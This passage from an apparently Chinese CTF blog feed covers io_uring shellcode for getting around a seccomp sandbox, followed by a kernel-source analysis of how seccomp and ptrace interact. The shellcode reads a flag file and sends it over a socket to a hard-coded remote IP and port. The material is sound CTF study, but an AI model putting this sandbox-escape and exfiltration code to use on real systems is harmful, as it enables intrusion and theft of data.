class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">2</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">3</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">3</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">3</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">3</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">4</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">4</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">4</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">4</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">5</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">5</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">5</span>].fd = <span class="number">6</span>;</span><br><span class="line">sqe[<span class="number">5</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">5</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">6</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">sqe[<span class="number">6</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">6</span>].fd = <span class="number">2</span>;</span><br><span class="line">sqe[<span class="number">6</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">7</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">sqe[<span class="number">7</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">7</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">7</span>].flags = <span class="number">4</span>;</span><br><span class="line">sqe[<span class="number">7</span>].addr = &amp;socket_add;</span><br><span class="line">sqe[<span class="number">7</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">8</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">8</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">8</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">8</span>].len = <span class="number">0x100</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">//mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    <span class="comment">//sqe[2].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_READ;</span><br><span class="line">    <span class="comment">//sqe[3].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">3</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    <span class="comment">//sqe[4].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">1</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 &lt;code&gt;io_uring_setup&lt;/code&gt; 一个系统调用，之前不久的ACTF中， 使用&lt;code&gt;mmap&lt;/code&gt;、&lt;code&gt;io_uring_setup&lt;/code&gt;、&lt;code&gt;io_uring_enter&lt;/code&gt; 三个系统调用，完成了orw。 如何仅仅使用 &lt;code&gt;io_uring_setup&lt;/code&gt; 完成orw呢？&lt;/p&gt;
&lt;p&gt;本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 &lt;code&gt;io_uring&lt;/code&gt;  具体的实现。&lt;/p&gt;
&lt;p&gt;由于笔者为安全方向，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="linux" scheme="https://v3rdant.cn/tags/linux/"/>
    
    <category term="io_uring" scheme="https://v3rdant.cn/tags/io-uring/"/>
    
    <category term="shellcode" scheme="https://v3rdant.cn/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Linux.Seccomp-and-Ptrace</title>
    <link href="https://v3rdant.cn/Linux.Seccomp-and-Ptrace/"/>
    <id>https://v3rdant.cn/Linux.Seccomp-and-Ptrace/</id>
    <published>2023-10-30T16:00:00.000Z</published>
    <updated>2024-01-12T13:06:54.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Background">Background</h2><p>最近ACTF出现了一个限制非常严格的沙箱，校队里一位pwn师傅搜到了一些用ptrace修改子进程rax来绕过seccomp的wp。</p><p>正值校赛，为了出题的事忙得焦头烂额，就没有细想。</p><p>但是由于我记得seccomp 是内核hook，而ptrace， 出于一些对调试器的映像，我觉得他对于attach的子进程的寄存器的更改，<s>是在用户态实现的</s>。 那么ptrace的处理应该在seccomp之前，所以我觉得不太可行。</p><p>在有时间后，我开始探究了一下，确实不太可行，只是原因跟我想象得不太一样…</p><span id="more"></span><h2 id="Intro">Intro</h2><p>在开始之前，先介绍一下三个概念：</p><ul><li>seccome</li><li>prctl</li><li>ptrace</li></ul><p>如果没有提到，以上代码均来自linux-6.6</p><h3 id="prctl-seccomp">prctl / seccomp</h3><p><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">prctl</a> 是linux下一个实现进程操控的系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="type">int</span>, option, <span class="type">unsigned</span> <span class="type">long</span>, arg2, <span class="type">unsigned</span> <span class="type">long</span>, arg3,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>, arg4, <span class="type">unsigned</span> <span class="type">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> =</span> current;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line"><span class="type">long</span> error;</span><br><span class="line"></span><br><span class="line">error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line"><span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (option) &#123;</span><br><span class="line"><span class="keyword">case</span> PR_SET_PDEATHSIG:</span><br><span class="line"><span class="keyword">if</span> (!valid_signal(arg2)) &#123;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">me-&gt;pdeath_signal = arg2;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.............</span></span><br><span class="line"><span class="comment">省略若干</span></span><br><span class="line"><span class="comment">.............</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">case</span> PR_GET_SECCOMP:</span><br><span class="line">error = prctl_get_seccomp();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.............</span></span><br><span class="line"><span class="comment">省略若干</span></span><br><span class="line"><span class="comment">.............</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读源码和man doc， 可以看到prctl主要实现了两类命令，<code>SET</code> 和 <code>GET</code> ， 即操作进程运行时和获取进程信息。</p><p>而seccomp就是基于prctl实现的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PR_SET_SECCOMP:</span><br><span class="line">error = prctl_set_seccomp(arg2, (<span class="type">char</span> __user *)arg3);</span><br></pre></td></tr></table></figure><p>这里涉及到这样一条调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--&gt;prctl </span><br><span class="line">--&gt;prctl_set_seccomp</span><br><span class="line">--&gt;do_seccomp</span><br><span class="line">--&gt;seccomp_set_mode_filter</span><br><span class="line">--&gt; seccomp_attach_filter </span><br></pre></td></tr></table></figure><p><code>seccomp_attach_filter</code> 核心代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filter-&gt;prev = current-&gt;seccomp.filter;</span><br><span class="line">seccomp_cache_prepare(filter);</span><br><span class="line">current-&gt;seccomp.filter = filter;</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;current-&gt;seccomp.filter_count);</span><br></pre></td></tr></table></figure><p>current是一个全局的指针，主要保存了当前进程的一些信息。</p><p>所以，当我们注册seccomp，实际上就是设置了当前进程的filter规则。而什么时候根据这个规则进行过滤呢？</p><p>笔者将在syscall的分析中给出答案。</p><h3 id="ptrace">ptrace</h3><p>ptrace是用来跟踪进程的一个系统调用</p><p>当使用ptrace进行 <code>PTRACE_SYSCALL</code> 也就是一般我们劫持系统调用的操作时：</p><p>ptrace的调用链如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--&gt;PTRACE_SYSCALL </span><br><span class="line">--&gt;arch_ptrace</span><br><span class="line">--&gt;ptrace_request</span><br><span class="line">--&gt; ptrace_resume</span><br><span class="line">--&gt;set_task_syscall_work</span><br></pre></td></tr></table></figure><p>可以看到最终调用了<code>set_task_syscall_work</code> 宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_task_syscall_work(t, fl) \</span></span><br><span class="line"><span class="meta">set_bit(SYSCALL_WORK_BIT_##fl, &amp;task_thread_info(t)-&gt;syscall_work)</span></span><br></pre></td></tr></table></figure><p>这个宏通过task_thread_info获取了监视的进程的记录结构地址（当被监视进程运行时，此时current指针也指向这个结构，但是此时是监视程序运行时，所以通过task_thread_info取得其地址）</p><p>在获取结构体地址后设置了 <code>SYSCALL_WORK_BIT</code> ， 一个标志位，</p><p>也就是说，实际上ptrace:<code>PTRACE_SYSCALL</code> 和 prctl: <code>PR_SET_SECCOMP</code> 都只是在进程info上添加了一些信息，最终真正的处理要等到syscall中。</p><h2 id="syscall">syscall</h2><p>syscall 是如何处理 seccomp 以及ptrace 的呢？</p><p>其经过了如下调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--&gt;entry_SYSCALL_64</span><br><span class="line">--&gt;do_syscall_64</span><br><span class="line">--&gt;syscall_enter_from_user_mode</span><br><span class="line">--&gt;__syscall_enter_from_user_work</span><br><span class="line">--&gt;syscall_trace_enter</span><br></pre></td></tr></table></figure><p>syscall_trace_enter代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">syscall_trace_enter</span><span class="params">(<span class="keyword">struct</span> pt_regs *regs, <span class="type">long</span> syscall,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Handle Syscall User Dispatch.  This must comes first, since</span></span><br><span class="line"><span class="comment"> * the ABI here can be something that doesn&#x27;t make sense for</span></span><br><span class="line"><span class="comment"> * other syscall_work features.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (work &amp; SYSCALL_WORK_SYSCALL_USER_DISPATCH) &#123;</span><br><span class="line"><span class="keyword">if</span> (syscall_user_dispatch(regs))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Handle ptrace */</span></span><br><span class="line"><span class="keyword">if</span> (work &amp; (SYSCALL_WORK_SYSCALL_TRACE | SYSCALL_WORK_SYSCALL_EMU)) &#123;</span><br><span class="line">ret = ptrace_report_syscall_entry(regs);</span><br><span class="line"><span class="keyword">if</span> (ret || (work &amp; SYSCALL_WORK_SYSCALL_EMU))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do seccomp after ptrace, to catch any tracer changes. */</span></span><br><span class="line"><span class="keyword">if</span> (work &amp; SYSCALL_WORK_SECCOMP) &#123;</span><br><span class="line">ret = __secure_computing(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1L</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Either of the above might have changed the syscall number */</span></span><br><span class="line">syscall = syscall_get_nr(current, regs);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(work &amp; SYSCALL_WORK_SYSCALL_TRACEPOINT))</span><br><span class="line">trace_sys_enter(regs, syscall);</span><br><span class="line"></span><br><span class="line">syscall_enter_audit(regs, syscall);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret ? : syscall;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中work由 <code>READ_ONCE(current_thread_info()-&gt;syscall_work)</code> 得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">long</span></span><br><span class="line">__syscall_enter_from_user_work(<span class="keyword">struct</span> pt_regs *regs, <span class="type">long</span> syscall)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> work = READ_ONCE(current_thread_info()-&gt;syscall_work);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (work &amp; SYSCALL_WORK_ENTER)</span><br><span class="line">syscall = syscall_trace_enter(regs, syscall, work);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由前面的分析我们可以知道， ptrace最终就是设置了<code>SYSCALL_WORK_BIT</code></p><p>也因此，这里的检测和处理，如注释所说的，就是处理我们在前面看到的seccomp和ptrace。</p><p>再看 <code>PTRACE_SYSCALL</code> 的实际处理函数 <code>ptrace_report_syscall</code>。</p><p>其中发送了SYSTRAP信号， 会让当前进程阻塞。等待ptrace的处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ptrace report for syscall entry and exit looks identical.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">ptrace_report_syscall</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> message)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ptrace = current-&gt;ptrace;</span><br><span class="line"><span class="type">int</span> signr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ptrace &amp; PT_PTRACED))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">signr = ptrace_notify(SIGTRAP | ((ptrace &amp; PT_TRACESYSGOOD) ? <span class="number">0x80</span> : <span class="number">0</span>),</span><br><span class="line">      message);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * this isn&#x27;t the same as continuing with a signal, but it will do</span></span><br><span class="line"><span class="comment"> * for normal use.  strace only continues with a signal if the</span></span><br><span class="line"><span class="comment"> * stopping signal is not SIGTRAP.  -brl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (signr)</span><br><span class="line">send_sig(signr, current, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fatal_signal_pending(current);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ptrace_report_syscall_entry - task is about to attempt a system call</span></span><br><span class="line"><span class="comment"> * @regs:user register state of current task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This will be called if %SYSCALL_WORK_SYSCALL_TRACE or</span></span><br><span class="line"><span class="comment"> * %SYSCALL_WORK_SYSCALL_EMU have been set, when the current task has just</span></span><br><span class="line"><span class="comment"> * entered the kernel for a system call.  Full user register state is</span></span><br><span class="line"><span class="comment"> * available here.  Changing the values in @regs can affect the system</span></span><br><span class="line"><span class="comment"> * call number and arguments to be tried.  It is safe to block here,</span></span><br><span class="line"><span class="comment"> * preventing the system call from beginning.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns zero normally, or nonzero if the calling arch code should abort</span></span><br><span class="line"><span class="comment"> * the system call.  That must prevent normal entry so no system call is</span></span><br><span class="line"><span class="comment"> * made.  If @task ever returns to user mode after this, its register state</span></span><br><span class="line"><span class="comment"> * is unspecified, but should be something harmless like an %ENOSYS error</span></span><br><span class="line"><span class="comment"> * return.  It should preserve enough information so that syscall_rollback()</span></span><br><span class="line"><span class="comment"> * can work (see asm-generic/syscall.h).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Called without locks, just after entering kernel mode.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> __must_check <span class="type">int</span> <span class="title function_">ptrace_report_syscall_entry</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ptrace_report_syscall(PTRACE_EVENTMSG_SYSCALL_ENTRY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正如注释所说，通过ptrace拦截系统调用后，对于寄存器的修改，都是在这个时间发生的。</p><blockquote><p>This will be called if %SYSCALL_WORK_SYSCALL_TRACE or<br>%SYSCALL_WORK_SYSCALL_EMU have been set, when the current task has just<br>entered the kernel for a system call.  Full user register state is<br>available here.  Changing the values in @regs can affect the system<br>call number and arguments to be tried.  It is safe to block here,<br>preventing the system call from beginning.&gt;</p></blockquote><p>而这一处理，在seccomp前面，所以即使通过ptrace拦截系统调用修改系统调用号后，seccomp还是会进行检查。</p><p>那为什么网上会有相关WP呢？</p><p>以下为linux-4.7的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 